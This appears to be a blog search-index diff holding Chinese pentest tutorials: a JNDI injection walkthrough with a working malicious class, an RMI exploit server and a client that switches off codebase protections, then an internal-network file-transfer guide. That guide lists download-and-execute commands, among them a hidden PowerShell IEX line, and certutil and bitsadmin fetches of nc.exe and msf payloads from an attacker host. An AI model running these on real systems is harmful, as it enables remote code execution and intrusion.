+<h3 id="1-4-2-实现举例"><a href="#1-4-2-实现举例" class="headerlink" title="1.4.2. 实现举例"></a>1.4.2. 实现举例</h3><h4 id="HelloInterface-class（定义远程接口）"><a href="#HelloInterface-class（定义远程接口）" class="headerlink" title="HelloInterface.class（定义远程接口）"></a>HelloInterface.class（定义远程接口）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloInterface</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">says</span> <span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="HelloImpl-class（HelloInterface远程接口实现类）"><a href="#HelloImpl-class（HelloInterface远程接口实现类）" class="headerlink" title="HelloImpl.class（HelloInterface远程接口实现类）"></a>HelloImpl.class（HelloInterface远程接口实现类）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">HelloInterface</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">says</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"test "</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Server-class（注册远程对象并绑定）"><a href="#Server-class（注册远程对象并绑定）" class="headerlink" title="Server.class（注册远程对象并绑定）"></a>Server.class（注册远程对象并绑定）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, NamingException </span>&#123;</span><br><span class="line">        <span class="comment">//配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常</span></span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,<span class="string">"rmi://127.0.0.1:1099"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化环境</span></span><br><span class="line">        InitialContext ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个注册表</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 远程调用对象</span></span><br><span class="line">        HelloInterface hello = <span class="keyword">new</span> HelloImpl();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 绑定</span></span><br><span class="line">        ctx.bind(<span class="string">"test"</span>, hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Client-class（远程调用）"><a href="#Client-class（远程调用）" class="headerlink" title="Client.class（远程调用）"></a>Client.class（远程调用）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> NamingException, RemoteException </span>&#123;</span><br><span class="line">        <span class="comment">//初始化环境</span></span><br><span class="line">        InitialContext init = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        <span class="comment">//JNDI的方式获取远程对象</span></span><br><span class="line">        HelloInterface hello = (HelloInterface) init.lookup(<span class="string">"rmi://127.0.0.1:1099/test"</span>);</span><br><span class="line">        <span class="comment">// 调用方法</span></span><br><span class="line">        System.out.println(hello.says(<span class="string">"123"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20230512/16838840435289.png" alt="image-20230512105732076"></p>
+<h2 id="1-5-JNDI动态协议转换"><a href="#1-5-JNDI动态协议转换" class="headerlink" title="1.5. JNDI动态协议转换"></a>1.5. JNDI动态协议转换</h2><p>我们上面的demo提前配置了jndi的初始化环境，还配置了<code>Context.PROVIDER_URL</code>，这个属性指定了到哪里加载本地没有的类，所以，上面的demo中 <code>init.lookup(&quot;rmi://127.0.0.1:1099/test&quot;)</code>这一处代码改为<code>init.lookup(&quot;test&quot;)</code>也是没啥问题的。</p>
+<p>那么动态协议转换是个什么意思呢？其实就是说即使提前配置了<code>Context.PROVIDER_URL</code>属性，当我们调用<code>lookup()</code>方法时，如果<code>lookup</code>方法的参数像demo中那样是一个<code>uri地址</code>，那么客户端就会去<code>lookup()</code>方法参数指定的<code>uri</code>中加载远程对象，而不是去<code>Context.PROVIDER_URL</code>设置的地址去加载对象(如果感兴趣可以跟一下源码，可以看到具体的实现）。</p>
+<p><strong>正是因为有这个特性，才导致当<code>lookup()</code>方法的参数可控时，攻击者可以通过提供一个恶意的url地址来控制受害者加载攻击者指定的恶意类。</strong></p>
+<p>但是你以为直接让受害者去攻击者指定的rmi注册表加载一个类回来就能完成攻击吗，是不行的，因为受害者本地没有攻击者提供的类的class文件，所以是调用不了方法的，所以我们需要借助接下来要提到的东西。</p>
+<h2 id="1-6-JNDI-Naming-Reference"><a href="#1-6-JNDI-Naming-Reference" class="headerlink" title="1.6. JNDI Naming Reference"></a>1.6. JNDI Naming Reference</h2><p><code>Reference类</code>表示对存在于命名/目录系统以外的对象的引用。如果远程获取 RMI 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。</p>
+<p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。</p>
+<p>在使用Reference时，我们可以直接将对象传入构造方法中，当被调用时，对象的方法就会被触发，创建Reference实例时几个比较关键的属性：</p>
+<ul>
+<li><code>className</code>：远程加载时所使用的类名；</li>
+<li><code>classFactory</code>：加载的class中需要实例化类的名称；</li>
+<li><code>classFactoryLocation</code>：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议；</li>
+</ul>
+<p>当然，要把一个对象绑定到<code>RMI注册表</code>中，这个对象需要继承<code>UnicastRemoteObject</code>，但是<code>Reference</code>没有继承它，所以我们还需要封装一下它，用 <code>ReferenceWrapper</code> 包裹一下<code>Reference</code>实例对象，这样就可以将其绑定到<code>RMI注册表</code>，并被远程访问到了</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一个参数是远程加载时所使用的类名</span></span><br><span class="line"><span class="comment">// 第二个参数是要加载的类的完整类名(这两个参数可能有点让人难以琢磨，往下看你就明白了）</span></span><br><span class="line"><span class="comment">// 第三个参数就是远程class文件存放的地址了</span></span><br><span class="line">Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"refClassName"</span>, <span class="string">"insClassName"</span>, <span class="string">"http://example.com:8888/"</span>); </span><br><span class="line">ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br></pre></td></tr></table></figure>
+
+<p>当有客户端通过<strong><code>lookup(&quot;refObj&quot;)</code></strong>获取远程对象时，获取的是一个Reference存根（Stub),由于是Reference的存根，所以客户端会现在本地的classpath中去检查是否存在类<code>refClassName</code>，如果不存在则去指定的url（<a href="http://example.com:8888/refClassName.class）动态加载，并且调用`insClassName`的**无参构造函数**，所以**可以在构造函数里写恶意代码。当然除了在无参构造函数中写利用代码，还可以利用java的" target="_blank" rel="noopener">http://example.com:8888/refClassName.class）动态加载，并且调用`insClassName`的**无参构造函数**，所以**可以在构造函数里写恶意代码。当然除了在无参构造函数中写利用代码，还可以利用java的</a> <code>static代码块</code> 来写恶意代码，因为static代码块的代码在class文件被加载过后就会立即执行，且只执行一次。**</p>
+<p>了解更多关于static代码块，参考：<a href="https://www.cnblogs.com/panjun-donet/archive/2010/08/10/1796209.html" target="_blank" rel="noopener">https://www.cnblogs.com/panjun-donet/archive/2010/08/10/1796209.html</a></p>
+<h2 id="1-7-JNDI注入"><a href="#1-7-JNDI注入" class="headerlink" title="1.7. JNDI注入"></a>1.7. JNDI注入</h2><h3 id="1-7-1-JNDI注入原理"><a href="#1-7-1-JNDI注入原理" class="headerlink" title="1.7.1. JNDI注入原理"></a>1.7.1. JNDI注入原理</h3><p>就是将恶意的<code>Reference类</code>绑定在RMI注册表中，其中恶意引用指向远程恶意的<code>class文件</code>，<strong>当用户在JNDI客户端的<code>lookup()</code>函数参数外部可控或<code>Reference类</code>构造方法的<code>classFactoryLocation参数</code>外部可控时</strong>，会使用户的JNDI客户端访问RMI注册表中绑定的恶意<code>Reference类</code>，从而加载远程服务器上的恶意<code>class文件</code>在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行</p>
+<p><img src="https://image.3001.net/images/20230512/16838840476588.png" alt="image-20230512110224374"></p>
+<h3 id="1-7-2-JNDI注入的利用条件"><a href="#1-7-2-JNDI注入的利用条件" class="headerlink" title="1.7.2. JNDI注入的利用条件"></a>1.7.2. JNDI注入的利用条件</h3><ul>
+<li>客户端的<code>lookup()</code>方法的参数可控</li>
+<li>服务端在使用<code>Reference类</code>时，<code>classFactoryLocation</code>参数可控</li>
+</ul>
+<p>上面两个都是在编写程序时可能存在的脆弱点（<strong>任意一个满足就行</strong>），除此之外，jdk版本在JNDI注入中也起着至关重要的作用，而且不同的攻击Payload对jdk的版本要求也不一致，这里就全部列出来：</p>
+<ul>
+<li>JDK 6u45、7u21之后：<code>java.rmi.server.useCodebaseOnly</code>的默认值被设置为<code>true</code>。当该值为<code>true</code>时，将禁用自动加载远程类文件，仅从<code>CLASSPATH</code>和当前JVM的<code>java.rmi.server.codebase</code>指定路径加载类文件。使用这个属性来防止客户端JVM从其他<code>Codebase</code>地址上动态加载类，增加了<code>RMI ClassLoader</code>的安全性。</li>
+<li>JDK 6u141、7u131、8u121之后：增加了<code>com.sun.jndi.rmi.object.trustURLCodebase</code>选项，默认为<code>false</code>，禁止<code>RMI</code>和<code>CORBA</code>协议使用远程<code>codebase</code>的选项，因此<code>RMI</code>和<code>CORBA</code>在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li>
+<li>JDK 6u211、7u201、8u191之后：增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为<code>false</code>，禁止<code>LDAP</code>协议使用远程<code>codebase</code>的选项，把LDAP协议的攻击途径也给禁了。</li>
+</ul>
+<blockquote>
+<p>可以看出RMI的Codebase限制明显比LDAP多，所以我们在日站的时候，最好也是用LDAP来进行注入。</p>
+</blockquote>
+<h3 id="1-7-3-JNDI注入攻击流程"><a href="#1-7-3-JNDI注入攻击流程" class="headerlink" title="1.7.3. JNDI注入攻击流程"></a>1.7.3. JNDI注入攻击流程</h3><ol>
+<li>攻击者通过可控url触发动态协议转换(<code>rmi://attack:1090/Exploit</code>)</li>
+<li>受害者服务器原上下文环境被转换为<code>rmi://attack:1090/Exploit</code></li>
+<li>受害者服务器去<code>rmi://attack:1090/Exploit</code>请求绑定对象Exploit，攻击者实现准备好的RMI服务器返回一个<code>ReferenceWrapper</code>对象(<code>Reference(&quot;Class1&quot;,&quot;Class2&quot;,&quot;http://evil:8080/&quot;)</code>)</li>
+<li>应用获取到<code>ReferenceWrapper</code>开始在本地查找<code>Class1</code>，发现无，则去请求<code>http://evil:8080/Class2.class</code></li>
+<li>web服务器返回事先准备好的恶意class文件，受害者服务器调用<code>Class2</code>的构造方法，恶意代码执行</li>
+</ol>
+<h3 id="1-7-4-JNDI注入举例"><a href="#1-7-4-JNDI注入举例" class="headerlink" title="1.7.4. JNDI注入举例"></a>1.7.4. JNDI注入举例</h3><h4 id="创建恶意类Evil（不能带package）"><a href="#创建恶意类Evil（不能带package）" class="headerlink" title="创建恶意类Evil（不能带package）"></a>创建恶意类Evil（不能带package）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;    <span class="comment">// 实现接口ObjectFactory，不然会报错，虽然不影响执行</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;  <span class="comment">// 构造方法，加载时会自动调用</span></span><br><span class="line">        exec(<span class="string">"open -na Calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Process runcmd = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        InputStreamReader inputStreamReader = <span class="keyword">new</span> InputStreamReader(runcmd.getInputStream());</span><br><span class="line">        BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(inputStreamReader);</span><br><span class="line">        String tmp;</span><br><span class="line">        <span class="keyword">while</span> ((tmp = bufferedReader.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">            System.out.println(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">        inputStreamReader.close();</span><br><span class="line">        bufferedReader.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="常见RMI服务端，绑定恶意的Reference到rmi注册表"><a href="#常见RMI服务端，绑定恶意的Reference到rmi注册表" class="headerlink" title="常见RMI服务端，绑定恶意的Reference到rmi注册表"></a>常见RMI服务端，绑定恶意的Reference到rmi注册表</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NamingException </span>&#123;</span><br><span class="line">        <span class="comment">//配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常</span></span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,<span class="string">"rmi://127.0.0.1:1099"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化环境</span></span><br><span class="line">        InitialContext ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个注册表</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 绑定恶意的Reference到rmi注册表</span></span><br><span class="line">        <span class="comment">// 注意，classFactoryLocation地址后面一定要加上/ 如果不加上/，那么则向web服务请求恶意字节码的时候，则会找不到该字节码</span></span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Evil"</span>, <span class="string">"Evil"</span>, <span class="string">"http://127.0.0.1:8888/"</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        ctx.bind(<span class="string">"evil"</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20230512/16838840534409.png" alt="image-20230512110359745"></p>
+<h4 id="客户端远程调用evil对应类"><a href="#客户端远程调用evil对应类" class="headerlink" title="客户端远程调用evil对应类"></a>客户端远程调用evil对应类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">"com.sun.jndi.rmi.object.trustURLCodebase"</span>, String.valueOf(<span class="keyword">true</span>));   <span class="comment">// 参考上面的利用条件，低版本不需要设置</span></span><br><span class="line">        System.setProperty(<span class="string">"com.sun.jndi.ldap.object.trustURLCodebase"</span>, String.valueOf(<span class="keyword">true</span>));  <span class="comment">// 参考上面的利用条件，低版本不需要设置</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化环境</span></span><br><span class="line">        InitialContext init = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        <span class="comment">// 远程调用evil，然后找不到服务端类Evil，就会调用http://127.0.0.1:8888/Evil.class</span></span><br><span class="line">        init.lookup(<span class="string">"rmi://127.0.0.1:1099/evil"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-8-参考"><a href="#1-8-参考" class="headerlink" title="1.8. 参考"></a>1.8. 参考</h2><ul>
+<li><a href="https://paper.seebug.org/417/" target="_blank" rel="noopener">https://paper.seebug.org/417/</a></li>
+<li><a href="https://p0rz9.github.io/2019/05/05/6.JNDI" target="_blank" rel="noopener">https://p0rz9.github.io/2019/05/05/6.JNDI</a></li>
+<li><a href="https://www.mi1k7ea.com/2019/09/15" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/09/15</a></li>
+<li><a href="https://www.cnblogs.com/0x7e/p/14578370.html" target="_blank" rel="noopener">https://www.cnblogs.com/0x7e/p/14578370.html</a></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>SOCKS代理</title>
+    <url>/2022/05/30/3.6%20%E4%B8%8A%E4%BC%A0%E5%92%8C%E4%B8%8B%E8%BD%BD/</url>
+    <content><![CDATA[<h1 id="内网中的上传和下载"><a href="#内网中的上传和下载" class="headerlink" title="内网中的上传和下载"></a>内网中的上传和下载</h1><a id="more"></a>
+
+<h2 id="利用FTP协议上传"><a href="#利用FTP协议上传" class="headerlink" title="利用FTP协议上传"></a>利用FTP协议上传</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp 【服务器的IP地址】</span><br><span class="line">put 【本地的文件】</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cd&lt;目录名&gt;:进入指定目录。</span><br><span class="line">lcd&lt;文件夹路径&gt;:定位本地文件夹(上传文件的位置或者下载文件的本地位置)。</span><br><span class="line">type:查看当前的传输方式(默认为ASCII码传输)。</span><br><span class="line">ascil:设置传输方式为ASCII码传输(传输TXT等格式的文件)。</span><br><span class="line">binary:设置传输方式为二进制传输(传输EXE文件，以及图片、视音频文件等)。</span><br><span class="line">close:结束与服务器的FTP会话。</span><br><span class="line">quit:结束与服务器的FTP会话并退出FTP环境。</span><br><span class="line">put&lt;文件名&gt; [newnamel:上传。&quot;newname&quot;为保存时的新名字，若不指定将以原名保存。</span><br><span class="line">send&lt;文件名&gt; [newname]:上传。&quot;newname为保存时的新名字.若不指定将以原名保存。</span><br><span class="line">get&lt;文件名&gt; [newname]:下载。newname为保存时的新名字，若不指定将以原名保存。</span><br><span class="line">mget filename filename..]:.下载多个文件。mget 命令支持空格和“？”两个通配符，例如“mget.mp3”表示下载FTP服务器当前目录下所有扩展名为“mp3”的文件</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用VBS上传"><a href="#利用VBS上传" class="headerlink" title="利用VBS上传"></a>利用VBS上传</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo Set Post &#x3D; CreateObject(&quot;Msxml2.XMLHTTP&quot;) &gt;&gt;download.vbs</span><br><span class="line">echo Set Shell &#x3D; CreateObject(&quot;Wscript.Shell&quot;) &gt;&gt;download.vbs</span><br><span class="line">echo Post.Open &quot;GET&quot;,&quot;ip&#x2F;文件&quot;,0 &gt;&gt;download.vbs</span><br><span class="line">echo Post.Send() &gt;&gt;download.vbs</span><br><span class="line">echo Set aGet &#x3D; CreateObject(&quot;ADODB.Stream&quot;) &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Mode &#x3D; 3 &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Type &#x3D; 1 &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Open() &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Write(Post.responseBody) &gt;&gt;download.vbs</span><br><span class="line">echo aGet.SaveToFile &quot; 下载到的位置&quot;,2 &gt;&gt;download.vbs</span><br><span class="line"> </span><br><span class="line">依次执行以上命令，会生成download.vbs，命令执行download.vbs，即可下载target.exe文件</span><br><span class="line">Cscript download.vbs</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用Debug上传"><a href="#利用Debug上传" class="headerlink" title="利用Debug上传"></a>利用Debug上传</h2><p>DEBUG是一个DOS实用程序，是供程序员使用的程序调试工具，可以用它检查内存中任何地方的字节以及修改任何地方的字节。它可以用于逐指令执行某个程序以验证程序运行的正确性，也可以追踪执行过程、比较一个指令执行前后的值以及比较与移动内存中数据的范围，读写文件与磁盘扇区。</p>
+<p>我们利用Debug向目标主机上传文件的原理就是，先将需要上传的exe文件转换为十六进制hex的格式，将hex的内容复制，再通过echo命令将hex内容写入到目标主机上的一个文件中，最后利用debug将hex内容编译成exe文件。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wine exe2bat.exe nc.exe nc.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用Nishang上传"><a href="#利用Nishang上传" class="headerlink" title="利用Nishang上传"></a>利用Nishang上传</h2><p>Download Excule是Nishang中的下载执行脚本，常用于下载文本文件并将其转换为EXE文件。使用Nishang上传文件的原理是:利用Nishang将上传的EXE文件转换为十六进制的形式，然后使用echo命令访问目标服务器，最后使用Download Exccute脚本下载文本文件并将其转换为EXE文件。<br>在这里，需要使用echo命令将Nishang PowersShell脚本的内容上传到目标服务器中，并将执行以下命令，利用Nishang中的exetolext.psl脚本将由Metasploit生成的msf.exe修改为文本文件msf.txt</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\ ExetoText c: msf.exe c: msf.txt</span><br></pre></td></tr></table></figure>
+
+<p>接着，通过echo命令，先将转换的HEX值添加到目标文件中，再将Nishang脚本文件的内容添加到目标文件中。最，输人如下命令，调用Dowlad Excule脚本下载并执行该文本文件。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Download_Execute http:&#x2F;&#x2F;192.168.0.11&#x2F;msf.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用bitsadmin-进行下载"><a href="#使用bitsadmin-进行下载" class="headerlink" title="使用bitsadmin 进行下载"></a>使用bitsadmin 进行下载</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下载命令：bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;172.16.12.128&#x2F;NC.exe E:\nc.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用powershell-进行下载"><a href="#使用powershell-进行下载" class="headerlink" title="使用powershell 进行下载"></a>使用powershell 进行下载</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本地下载：powershell (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;172.16.12.128&#x2F;NC.exe&#39;,&#39;nc.exe&#39;)</span><br><span class="line">远程执行：powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;172.16.12.128&#x2F;NC.exe&#39;))&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用-certutil-进行下载"><a href="#使用-certutil-进行下载" class="headerlink" title="使用 certutil 进行下载"></a>使用 certutil 进行下载</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下载文件：certutil -urlcache -split -f http:&#x2F;&#x2F;172.16.12.128&#x2F;NC.exe</span><br><span class="line">删除缓存：certutil -urlcache -split -f http:&#x2F;&#x2F;172.16.12.128&#x2F;NC.exe delete</span><br><span class="line">缓存目录：&quot;%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用-WGET-进行下载"><a href="#使用-WGET-进行下载" class="headerlink" title="使用 WGET 进行下载"></a>使用 WGET 进行下载</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">上传免安装的可执行程序wget.exe到目标机器，使用wget下载文件。</span><br><span class="line">wget.exe下载：https:&#x2F;&#x2F;eternallybored.org&#x2F;misc&#x2F;wget&#x2F;</span><br><span class="line">下载命令：wget.exe -O &quot;nc.exe&quot; http:&#x2F;&#x2F;172.16.12.128&#x2F;NC.exe</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
+        <tag>隧道</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SOCKS代理</title>
+    <url>/2022/05/30/3.5%20SOCKS%E4%BB%A3%E7%90%86/</url>
+    <content><![CDATA[<h1 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h1><p>常见的网络场景有如下三类。</p>
+<ul>
+<li>服务器在内网中，可以任意访问外部网络。</li>
+<li>服务器在内网中，可以访问外部网络，但服务器安装了防火墙来拒绝敏感端口的连接。</li>
+<li>服务器在内网中，对外只开放了部分端口(例如80端口),且服务器不能访问外部网络。</li>
+</ul>
+<a id="more"></a>
+
